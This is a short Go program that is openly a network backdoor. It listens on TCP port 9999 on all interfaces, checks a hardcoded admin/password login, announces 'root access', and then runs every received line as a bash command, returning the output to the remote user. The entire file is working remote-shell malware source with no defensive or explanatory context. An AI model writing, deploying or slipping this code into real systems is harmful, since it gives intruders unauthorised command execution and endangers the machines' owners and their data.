package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

const (
	host       = "0.0.0.0"
	port       = "9999"
	username   = "admin"
	password   = "password"
	prompt     = "backdoor> "
	exitPrompt = "exit"
)

func main() {
	listener, err := net.Listen("tcp", host+":"+port)
	if err != nil {
		fmt.Println("Error starting the server:", err)
		return
	}
	fmt.Println("Server is listening on", host+":"+port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}

		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)

	writer.WriteString("Enter your username: ")
	writer.Flush()
	usernameInput, _ := reader.ReadString('\n')
	usernameInput = strings.TrimSpace(usernameInput)

	writer.WriteString("Enter your password: ")
	writer.Flush()
	passwordInput, _ := reader.ReadString('\n')
	passwordInput = strings.TrimSpace(passwordInput)

	if usernameInput != username || passwordInput != password {
		writer.WriteString("Invalid username or password. Connection closed.\n")
		writer.Flush()
		return
	}

	writer.WriteString("Authentication successful. You now have root access.\n")
	writer.WriteString("Type 'exit' to quit.\n")
	writer.WriteString(prompt)
	writer.Flush()

	for {
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)

		if command == exitPrompt {
			writer.WriteString("Connection closed.\n")
			writer.Flush()
			return
		}

		cmd := exec.Command("/bin/bash", "-c", command)
		cmd.Stdout = writer
		cmd.Stderr = writer
		cmd.Run()

		writer.WriteString(prompt)
		writer.Flush()
	}
}